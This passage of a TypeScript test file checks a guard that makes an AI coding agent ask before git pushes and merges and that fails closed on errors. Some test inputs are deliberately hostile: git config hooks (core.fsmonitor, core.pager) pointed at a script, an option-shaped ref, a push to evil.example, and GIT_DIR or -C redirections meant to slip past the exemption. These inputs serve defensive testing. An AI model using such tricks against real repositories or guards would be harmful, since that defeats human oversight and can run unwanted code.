    remoteRef(trap, 'main', c);
    track(trap, 'main');
    commit(trap, 'y');
    // Set last: the test's own git calls above would run them.
    git(trap, 'config', 'core.fsmonitor', script);
    git(trap, 'config', 'core.pager', script);
    const d = detectPublish('git push');
    if (!d) throw new Error('no publish');
    await publishFacts(d, 'git push', trap, ctx);
    expect(existsSync(marker)).toBe(false);
  });

  it('refuses a ref that looks like an option', async () => {
    const d = detectPublish('git merge -- --output=/tmp/evil');
    if (!d) throw new Error('no publish');
    const f = await publishFacts({ ...d, ref: '--output=/tmp/evil' }, 'x', repo, ctx);
    expect(f.commits).toBeNull();
  });
});

describe('isBrainSync (decision 6 exemption)', () => {
  let brain: string;
  let bctx: AppCodeContext;

  beforeAll(() => {
    brain = makeRepo(join(root, 'sync', 'brain'), 'https://github.com/o/brain.git');
    const c = commit(brain, 'x');
    remoteRef(brain, 'main', c);
    track(brain, 'main');
    mkdirSync(join(brain, 'clients'), { recursive: true });
    bctx = { ...ctx, brainRoot: brain };
  });

  async function sync(cmd: string, cwd = brain): Promise<boolean> {
    const d = detectPublish(cmd);
    if (!d) throw new Error('no publish');
    return isBrainSync(d, cwd, bctx);
  }

  it("exempts the brain's own plain push of main", async () => {
    expect(await sync('git push')).toBe(true);
    expect(await sync('git push origin main')).toBe(true);
    expect(await sync('git push', join(brain, 'clients'))).toBe(true);
  });

  it('exempts it after a commit whose message heredoc has an apostrophe', async () => {
    const cmd = "git commit -m \"$(cat <<'EOF'\nfix: the push notice doesn't wrap\nEOF\n)\" && git push";
    expect(await sync(cmd)).toBe(true);
  });

  it('never exempts a push pointed elsewhere by the environment, git options or pushd', async () => {
    for (const cmd of [
      `GIT_DIR=${other}/.git git push`,
      `env GIT_DIR=${other}/.git git push`,
      `GIT_DIR=x GIT_WORK_TREE=y git push`,
      `pushd ${other} && git push`,
      `export GIT_DIR=${other}/.git; git push`,
      `GIT_DIR=${other}/.git; export GIT_DIR; git push`,
      `git --git-dir=${other}/.git push`,
      `git -C "${brain}" push`,
      `cd ${other} && git push`,
    ]) {
      expect(await sync(cmd), cmd).toBe(false);
    }
    expect(await sync(`git -C "${brain}" push`, other)).toBe(false);
  });

  it('never exempts a force push, a delete, a merge, another branch or another repo', async () => {
    expect(await sync('git push --force')).toBe(false);
    expect(await sync('git push -f origin main')).toBe(false);
    expect(await sync('git push origin --delete main')).toBe(false);
    expect(await sync('git push --mirror')).toBe(false);
    expect(await sync('git push --all')).toBe(false);
    expect(await sync('git push origin feature')).toBe(false);
    expect(await sync('git push https://evil.example/x main')).toBe(false);
    expect(await sync('git merge x')).toBe(false);
    expect(await sync('git push && git push other main')).toBe(false);
    expect(await sync('git push', other)).toBe(false);
    git(brain, 'checkout', '-q', '-b', 'side');
    expect(await sync('git push')).toBe(false);
    git(brain, 'checkout', '-q', 'main');
  });
});

describe('guardToolCall (decision 7: failing closed)', () => {
  const deps = (over: Partial<Parameters<typeof guardToolCall>[3]> = {}) => ({
    getRole: async (): Promise<Role> => 'owner',
    ctx,
    ...over,
  });

  it('asks with facts for a publish', async () => {
    const a = await guardToolCall('Bash', { command: 'git push' }, other, deps());
    expect(a.decision).toBe('ask');
    if (a.decision === 'ask') expect(a.facts?.kind).toBe('push');
  });

  it('asks for a GitHub MCP merge', async () => {
    const a = await guardToolCall('mcp__github__merge_pull_request', { pull_number: 1 }, other, deps());
    expect(a.decision).toBe('ask');
    if (a.decision === 'ask') expect(a.facts?.kind).toBe('merge');
  });

  it('lets ordinary calls through', async () => {
    expect((await guardToolCall('Bash', { command: 'ls' }, other, deps())).decision).toBe('continue');
    expect((await guardToolCall('Read', { file_path: '/x' }, other, deps())).decision).toBe('continue');
  });

  it("answers exempt for the brain's own sync", async () => {
    const brain = makeRepo(join(root, 'guard', 'brain'), 'https://github.com/o/b.git');
    const c = commit(brain, 'x');
    remoteRef(brain, 'main', c);
    track(brain, 'main');
    const a = await guardToolCall(
      'Bash',
      { command: 'git push' },
      brain,
      deps({ ctx: { ...ctx, brainRoot: brain } }),
    );
    expect(a.decision).toBe('exempt');
  });

  it('still asks when an error happens after a publish was detected, with just the command', async () => {
    const a = await guardToolCall(
      'Bash',
      { command: 'git push' },
      other,
      deps({
        facts: async () => {
          throw new Error('boom');
        },
      }),
    );
    expect(a.decision).toBe('ask');
    if (a.decision === 'ask')
      expect(a.facts).toMatchObject({ kind: 'push', command: 'git push', repo: null });
  });

  it('still asks when the exemption check throws', async () => {
    const a = await guardToolCall(
      'Bash',
      { command: 'git push' },
      other,
      deps({
        brainSync: async () => {
          throw new Error('boom');
        },
      }),
    );
    expect(a.decision).toBe('ask');
  });

  it('denies when the team check throws', async () => {
    const a = await guardToolCall(
      'Bash',
      { command: 'git push' },
      other,
      deps({
        refusal: async () => {
          throw new Error('boom');
        },
      }),
    );
    expect(a).toEqual({ decision: 'deny', reason: CHANGE_CHECK_FAILED, notice: CHANGE_CHECK_FAILED });
  });

  it('runs the team refusal before publish detection', async () => {
    const a = await guardToolCall(
      'Bash',
      { command: `git -C "${ctx.appRoot}" push` },
      other,
      deps({ getRole: async () => 'team' }),
    );
    expect(a).toEqual({ decision: 'deny', reason: TEAM_APP_REFUSAL, notice: TEAM_APP_NOTICE });
  });
});

describe('quickPublishFacts (canUseTool with no stored facts)', () => {
  it('detects from the input alone, with no repo facts', () => {
    expect(quickPublishFacts('Bash', { command: 'git push -f' })).toMatchObject({
      kind: 'push',
      command: 'git push -f',
      repo: null,
      warning: expect.stringMatching(/force push/),
    });
    expect(quickPublishFacts('mcp__github__merge_pull_request', { pull_number: 1 })?.kind).toBe('merge');
    expect(quickPublishFacts('Bash', { command: 'ls' })).toBeNull();
    expect(quickPublishFacts('Read', { file_path: '/x' })).toBeNull();
  });
});

describe('standing lines (decision 11)', () => {
  it('say not to ask in the chat, and who changes the app', () => {
    expect(PUBLISH_LINE).toMatch(
      /^At the point you would ask whether to merge or push, don't ask in the chat/,
    );
    expect(PUBLISH_LINE).toContain('AskUserQuestion');
    expect(APP_CODE_LINE).toContain('Only owners and scouts');
    expect(APP_CODE_LINE).toContain('TDS Cortex Feedback');
    expect(TEAM_APP_REFUSAL).toContain('the-digital-stride/tds-cortex-feedback');
    expect(TEAM_APP_REFUSAL).toContain('Feature Request');
  });

  it('tell the person who can help when the role or the check fails', () => {
    expect(UNKNOWN_ROLE_NOTICE).toBe(
      "Cortex couldn't tell who you are, so it didn't change the app. Ask an owner or scout to run /doctor-cortex for you.",
    );
    expect(CHANGE_CHECK_FAILED).toBe(
      "Cortex couldn't check whether this changes its own code, so it didn't run it. Try again, or ask an owner or scout to run /doctor-cortex if it keeps happening.",
    );
  });
});
